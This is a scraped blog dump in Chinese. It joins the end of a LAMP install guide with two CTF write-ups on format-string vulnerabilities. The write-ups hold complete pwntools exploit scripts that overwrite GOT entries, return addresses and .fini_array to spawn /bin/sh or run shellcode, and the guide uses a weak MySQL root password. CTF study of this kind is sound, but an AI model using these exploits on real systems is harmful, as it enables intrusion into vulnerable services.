cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ &gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \\ &gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \\ &gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \\ &gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \\ &gt; -DMYSQL_TCP_PORT=3306 [root@localhost mysql-5.5.23]# make [root@localhost mysql-5.5.23]# make install简单设置初始化mysql： [root@localhost mysql]# chown -R mysql:mysql . [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql设置权限： [root@localhost mysql]# chown -R root . [root@localhost mysql]# chown -R mysql data/覆盖一下配置文件： [root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnf cp：是否覆盖&quot;/etc/my.cnf&quot;？ yes接着初始化： [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;. 200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data 200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 发现卡死了： [root@localhost mysql-5.5.23]# ps aux | grep mysql [root@localhost mysql-5.5.23]# kill -9 102872 [root@localhost mysql-5.5.23]# ps aux | grep mysql mysql 103111 0.0 4.9 727288 49260 pts/3 Sl 03:39 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306 root 103201 0.0 0.0 112728 972 pts/2 S+ 03:46 0:00 grep --color=auto mysql杀掉重新来。 [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql成功了。 自启动[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local 设置mysql密码[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot; [root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p 成功了。注意 history -c 清楚历史记录命令。服务都正常，字符集格式也在。 php准备工作[root@localhost mysql]# yum -y install libtool* [root@localhost local]# yum -y install libpng-devel让php支持数据库的内容： [root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h 开始安装[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear [root@localhost php-5.4.25]# make [root@localhost php-5.4.25]# make install 配置[root@localhost php-5.4.25]# mkdir /usr/local/php/etc [root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini复制主配置文件到/usr/local/php/etc [root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf 修改apache2配置，让其也可以支持php 重启apache2: [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stop AH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl start AH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this messagerestart 可能是无效的。 验证apache与php [root@localhost htdocs]# vi index.php写一个php探针： &lt;?php phpinfo(); ?&gt; apache与MySQL&lt;?php $link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;); if($link) echo &quot;Congratulations!!!!!!&quot;; mysql_close(); ?&gt; phpadmin搭建[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin配置文件[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php [root@localhost phpmyadmin]# vi config.inc.php访问测试：","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"格式化字符串漏洞小总结（下）","slug":"格式化字符串漏洞小总结（下）","date":"2020-04-03T08:59:50.107Z","updated":"2020-06-27T14:27:05.139Z","comments":true,"path":"2020/04/03/格式化字符串漏洞小总结（下）/","link":"","permalink":"http://chumen77.xyz/2020/04/03/格式化字符串漏洞小总结（下）/","excerpt":"","text":"格式化字符串漏洞小总结（下）前言接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。 格式化字符串在栈上劫持got 每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址 可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去例如 ：将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。￼这一攻击过程可以分为以下几个步骤： 确定一下printf函数的GOT表的地址，如图中是0x804a010 确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt） 在栈上构造出printf函数GOT表的地址 利用fmt漏洞修改printf函数GOT表上的地址 然后看一个例题： inndy-echo保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); exit(0); } 可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。 攻击思路： 在栈上放好printf函数的GOT表地址，并确定一下偏移 改这个GOT上的地址为system函数的plt 改好一会，传送一个/bin/sh，此时就会变成system(/bin/sh) 在执行的过程中需要注意一下，改GOT表上的值要单次printf多次写入，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下字节对齐。 gdb调试gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\\n&quot;) 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;) 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (&quot;AAAA\\n&quot;)gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (&quot;\\%6$p&quot;)确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就().ljust补成0x20的a，也就是offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = process(&#39;./echo&#39;) io = remote(&#39;node3.buuoj.cn&#39;,26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.send(&#39;/bin/sh\\x00&#39;) io.interactive() 换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数fmtstr_payload，面对32位，这种情况还是很好用的： from pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = process(&#39;./echo&#39;) io = remote(&#39;node3.buuoj.cn&#39;,26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,{printf_got : system_plt}) io.sendline(payload) io.send(&#39;/bin/sh\\x00&#39;) io.interactive() 可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试） 劫持retaddress顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路： jmp到带有system(/bin/sh) 的后门函数 不开nx保护，jmp到自己构造的shellcode上。 提前泄漏libc算出libc的base，jmp到onegadget地址 看一个简单的例子： 三个白帽 - pwnme-k0保护和arch Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)64位程序，且开启了RELRO保护，这样就无法修改got表了。 ida分析这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞： int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) { write(0, &quot;Welc0me to sangebaimao!\\n&quot;, 0x1AuLL); printf(&amp;formata, &quot;Welc0me to sangebaimao!\\n&quot;); return printf(&amp;a9 + 4); } 并且发现其中输出的buf就是你输入的密码： 还发现其中有个后门函数： 会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。 gdb调试：定位到这个存在漏洞的printf当中，确定一下：看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。 然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。 然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./pwnme_k0&#39;) # context.clear(arch = &#39;amd64&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(&#39;%0006$lx&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(&#39;11111111&#39;) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;1&#39;) # io.recvuntil(&#39;Welc0me to sangebaimao!\\n&#39;) stack = int(io.recvline_contains(&#39;7f&#39;),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = &#39;%2218c%8$hn&#39; io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;2&#39;) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(p64(ret_add)) io.recvuntil(&#39;lenth:20): \\n&#39;) io.sendline(payload) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;1&#39;) io.interactive() 修改FINI_ARRAY区在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一点。 简单地说,一个程序在调用 main函数前会调用.init段代码和 .init_array 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用.fini段代码和 .fini_arrary 段的函数数组中的每一个函数指针。 其中FINI_ARRAY区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改.fini_array区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。 需要注意的是,这个区的内容在再次从start开始执行后又会被修改。 mma-ctf-2nd-2016-greeting保护和arch Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-84h] char v5; // [esp+5Ch] [ebp-44h] unsigned int v6; // [esp+9Ch] [ebp-4h] v6 = __readgsdword(0x14u); printf(&quot;Please tell me your name... &quot;); if ( !getnline(&amp;v5, 64) ) return puts(&quot;Don&#39;t ignore me ;( &quot;); sprintf(&amp;s, &quot;Nice to meet you, %s :)\\n&quot;, &amp;v5); return printf(&amp;s); } 发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。再看下getnline函数： size_t __cdecl getnline(char *s, int n) { char *v3; // [esp+1Ch] [ebp-Ch] fgets(s, n, stdin); v3 = strchr(s, 10); if ( v3 ) *v3 = 0; return strlen(s); } 发现有了strlen的函数，并且其参数也是可以控制的。这就有了攻击思路，在触发格式化字符串的漏洞时： 修改.fini_array区的一个函数指针地址为start，让其重启跑一次程序 因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system 待程序重新跑起来，就在传送一个/bin/sh即可 注意的是,这个.fini_array区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。 gdb调试这个题目因为前面有 sprintf(&amp;s, &quot;Nice to meet you, %s :)\\n&quot;, &amp;v5); 所以其栈上会放上Nice to meet you,的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来().ljust(0x32,&#39;a&#39;) ,所以偏移需要加上(0x32 - 2)/4 = 24 expfrom pwn import * context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; io = process(&#39;./greeting&#39;) # io = remote(&#39;111.198.29.45&#39;,42729) elf = ELF(&#39;./greeting&#39;) strlen_got = 0x08049A54 fini_array = 0x08049934 start = 0x080484F0 system_plt = 0x08048490 offset = 12 def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result key1 = 0x08048490 prev = 18 #注意这个题在可控格式化字符串前有字符输出 payload = &quot;&quot; for i in range(2): payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff key2 = 0x84F0 for i in range(1): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x32,&#39;a&#39;) payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array) io.recvuntil(&#39;name...&#39;) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;name...&#39;) io.sendline(&#39;/bin/sh\\x00&#39;) io.interactive() 小tips绕过canary可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。 printf家族的其他函数首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。 fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用 sprintf：可以用%xxc 来造成新的buffer overflow 劫持__stack_chk_fail 在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改__stack_chk_fail 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址 在只有一次 stack overflow+fmt 时可以将__stack_chk_fail改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。 格式化字符串不在栈上有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在 stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。 EBP链 正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后 通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。 改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。 简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，在这个过程当中一定要学会对栈上的已有数据的灵活的运用。 接下来看一个题来仔细分析一下 hitcontraining-playfmt保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments没有任何保护。 ida分析int do_fmt() { int result; // eax while ( 1 ) { read(0, buf, 0xC8u); result = strncmp(buf, &quot;quit&quot;, 4u); if ( !result ) break; printf(buf); } return result; } 其中看到buf在bss段：这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。 上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。 攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。 gdb调试定位到printf函数处： gdb-peda$ b *0x0804854F Breakpoint 1 at 0x804854f可以看一下此时的栈情况：esp寄存器：这里就把0xffffd338叫做ebp3，0xffffd348为ebp2，0xffffd358为ebp1。 第一次修改：对ebp2使用%xxhhn修改ebp1为do-fmt函数的retaddr 0xffffd33c的栈指针（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来） 第二次修改 ： 对ebp1使用%xxhn 修改retaddr 0x80485ad 为你在buf处提前摆上的shellcode 这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。 expfrom pwn import * import time context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; io = process(&#39;./ebp&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input(&#39;-&gt;&#39;) io.sendline(&#39;%4$p&#39;) ret_stack_addr = int(io.recv(10),16) - 28 print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = &#39;%{}c%4$hhn&#39;.format(key1) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recv() payload = &#39;%{}c%12$hn&#39;.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() 这个题目就是很单纯的直接利用ebp链进行攻击即可。 然后再看一个有点不一样的题目： inndy-echo3保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析 这一处会让栈结构的情况变得无法预测。然后进入hardfmt： for ( i = 0; i &lt;= 4; ++i ) { read(0, buff, 0x1000u); printf(buff); } 这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：改printf的got表，然后在第5次传过去/bin/sh即可。（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做） gdb分析定位到漏洞printf函数处：会发现这个情况是没有构成ebp链的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。 因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。 我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ： 泄漏libc基址，计算出system的内存地址。 在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016） 在构造的got地址上，开始写system地址由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。 如上图所示，很简单就可以泄漏出libc基址。但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。 此时注意图上前两个红框，可以发现把前二个红框虽不是ebp的链，但是这也是成一个链可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针： 这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的： gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60 这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。 接着就可以构造got地址和got+2地址： gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 然后就可以利用对got地址和got+2地址使用%xhn,写system的内存地址上printf的got了： 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc)写好以后，再传过去一下/bin/sh即可。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch =&#39;i386&#39; import time elf = ELF(&#39;./echo3&#39;) debug = 1 while True: if debug : io = process(&#39;./echo3&#39;) libc = elf.libc else: io = remote(&#39;node3.buuoj.cn&#39;,25057) libc = ELF(&#39;./libc-2.23.so.i386&#39;) payload = &#39;%43$pA%30$pA%47$p&#39; io.sendline(payload) address = io.recvline().strip() if address[-3:] == &#39;637&#39;: if address[7:10] == &#39;637&#39;: libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols[&#39;system&#39;] print(&#39;system_addr -&gt;&#39; + hex(system_addr)) print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point)) print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point)) break else : io.close() continue def fmtshort(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result def fmtbyte(prev,val,idx,byte = 1): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hhn&quot; return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info(&#39;--------change the two points to tag_stack_point:-------&#39;) # raw_input(&#39;-&gt;&#39;) prev = 0 payload = &quot;&quot; for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + &#39;1111&#39; io.sendline(payload) io.recvuntil(&#39;1111&#39;) info(&#39;--------change got_table to printf_got:-------&#39;) prev = 0 payload = &quot;&quot; key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + &#39;2222&#39; io.sendline(payload) io.recvuntil(&#39;2222&#39;) info(&#39;--------change printf_got to system_addr:-------&#39;) raw_input(&#39;-&gt;&#39;) prev = 0 payload = &quot;&quot; key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print(&#39;key5 -&gt; &#39; + hex(key5)) print(&#39;key6 -&gt; &#39; + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + &#39;3333&#39; io.sendline(payload) sleep(1) io.recvuntil(&#39;3333&#39;) raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;) io.sendline(&#39;/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00&#39;) io.interactive() 这个exp的难点在于： 注意去定位到合适的栈结构再去利用 尽量充分利用每一次的printf 单次printf多次写入 注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。 小总结通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会灵活、充分的利用栈上的数据,单纯的ebp链只是适合简单的情况。 但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是针对性程序本身的，基本不会受到libc版本的影响，用起来很好用，要优先考虑。 还有就是面对这种会有随机栈情况、没有ebp链的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"格式化字符串漏洞题目练习","slug":"格式化字符串漏洞题目练习","date":"2020-03-15T06:38:15.000Z","updated":"2020-06-26T03:43:20.333Z","comments":true,"path":"2020/03/15/格式化字符串漏洞题目练习/","link":"","permalink":"http://chumen77.xyz/2020/03/15/格式化字符串漏洞题目练习/","excerpt":"","text":"格式化字符串漏洞题目练习前言整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。 inndy_echo保护和arch[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); exit(0); } 可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去/bin/sh，此时就会变成system(/bin/sh) gdb调试gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\\n&quot;) 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;) 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (&quot;AAAA\\n&quot;)gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (&quot;\\%6$p&quot;) 确定偏移是7，打算一会写payload时候需要补齐，就.ljust补成0x20的，也就是offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = process(&#39;./echo&#39;) io = remote(&#39;node3.buuoj.cn&#39;,26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.send(&#39;/bin/sh\\x00&#39;) io.interactive() 换一种就是用pwntools模块，面对32位，这种情况还是很好用的： from pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = process(&#39;./echo&#39;) io = remote(&#39;node3.buuoj.cn&#39;,26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,{printf_got : system_plt}) io.sendline(payload) io.send(&#39;/bin/sh\\x00&#39;) io.interactive() [DEBUG] Sent 0x3c bytes: 